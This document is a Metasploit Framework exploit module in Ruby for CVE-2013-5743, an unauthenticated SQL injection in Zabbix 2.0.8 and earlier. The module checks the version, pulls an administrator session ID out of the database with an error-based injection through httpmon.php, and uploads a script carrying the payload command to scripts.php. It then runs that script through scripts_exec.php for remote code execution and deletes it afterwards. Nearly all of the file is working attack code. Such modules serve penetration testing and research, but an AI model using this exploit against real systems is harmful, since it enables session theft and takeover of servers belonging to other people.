# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Zabbix 2.0.8 SQL Injection and Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix
        versions 2.0.8 and lower.  The SQL injection issue can be abused in order to retrieve an
        active session ID.  If an administrator level user is identified, remote code execution
        can be gained by uploading and executing remote scripts via the &#039;scripts_exec.php&#039; file.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Lincoln <Lincoln[at]corelan.be>&#039;, # Discovery, Original Proof of Concept
          &#039;Jason Kratzer <pyoor[at]corelan.be>&#039; # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-5743&#039;],
          [&#039;URL&#039;, &#039;https://support.zabbix.com/browse/ZBX-7091&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Zabbix version <= 2.0.8&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 255,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl python&#039;
            }
        },
      &#039;DisclosureDate&#039; => "Sep 23 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable Zabbix instance&#039;, &#039;/zabbix&#039;])
        ], self.class)
  end

  def uri
    return target_uri.path
  end

  def check
    # Check version
    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "httpmon.php")
    })

    if res and res.code == 200 and res.body =~ /(STATUS OF WEB MONITORING)/ and res.body =~ /(?<=Zabbix )(.*)(?= Copyright)/
      version = $1
      print_status("#{peer} - Zabbix version #{version} detected")
    else
      # If this fails, guest access may not be enabled
      print_status("#{peer} - Unable to access httpmon.php")
      return Exploit::CheckCode::Unknown
    end

    if version and version <= "2.0.8"
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def get_session_id
    # Generate random string and convert to hex
    sqlq = rand_text_alpha(8)
    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join
    sqli = "2 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST"
    sqli << "(sessionid AS CHAR),0x20)),1,50) FROM zabbix.sessions WHERE status=0 and userid=1 "
    sqli << "LIMIT 0,1),0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    # Extract session id from database
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri("#{uri}", "httpmon.php"),
      &#039;vars_get&#039; => {
        "applications" => sqli
      }
    })

    if res && res.code == 200 and res.body =~ /(?<=#{sqlq})(.*)(?=#{sqlq})/
      session = $1
      print_status("#{peer} - Extracted session cookie - [ #{session} ]")
      return session
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to extract a valid session")
    end
  end

  def exploit
    # Retrieve valid session id
    @session = get_session_id
    @sid = "#{@session[16..-1]}"
    script_name = rand_text_alpha(8)
    # Upload script
    print_status("#{peer} - Attempting to inject payload")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => "zbx_sessionid=#{@session}",
      &#039;uri&#039;    => normalize_uri(uri, "scripts.php"),
      &#039;vars_post&#039; => {
        &#039;sid&#039; => @sid,
        &#039;form&#039; => &#039;Create+script&#039;,
        &#039;name&#039; => script_name,
        &#039;type&#039; => &#039;0&#039;,
        &#039;execute_on&#039; => &#039;1&#039;,
        &#039;command&#039; => payload.encoded,
        &#039;commandipmi&#039; => &#039;&#039;,
        &#039;description&#039; => &#039;&#039;,
        &#039;usrgrpid&#039; => &#039;0&#039;,
        &#039;groupid&#039; => &#039;0&#039;,
        &#039;access&#039; => &#039;2&#039;,
        &#039;save&#039; => &#039;Save&#039;
      }
    })

    if res and res.code == 200 and res.body =~ /(Script added)/
      print_status("#{peer} - Payload injected successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - Payload injection failed!")
    end

    # Extract &#039;scriptid&#039; value
    @scriptid = /(?<=scriptid=)(\d+)(?=&sid=#{@sid}">#{script_name})/.match(res.body)

    # Trigger Payload
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri("#{uri}", "scripts_exec.php"),
      &#039;cookie&#039; => "zbx_sessionid=#{@session}",
      &#039;vars_get&#039; => {
        "execute" =>1,
        "scriptid" => @scriptid,
        "sid" => @sid,
        "hostid" => "10084"
      }
    })
  end

  def cleanup
    post_data = "sid=#{@sid}&form_refresh=1&scripts[#{@scriptid}]=#{@scriptid}&go=delete&goButton=Go (1)"
    print_status("#{peer} - Cleaning script remnants")
    res = send_request_cgi({
     &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => post_data,
      &#039;cookie&#039; => "zbx_sessionid=#{@session}",
      &#039;uri&#039;    => normalize_uri(uri, "scripts.php")
    })

    if res and res.code == 200 and res.body =~ /(Script deleted)/
      print_status("#{peer} - Script removed successfully")
    else
      print_warning("#{peer} - Unable to remove script #{@scriptid}")
    end
  end
end

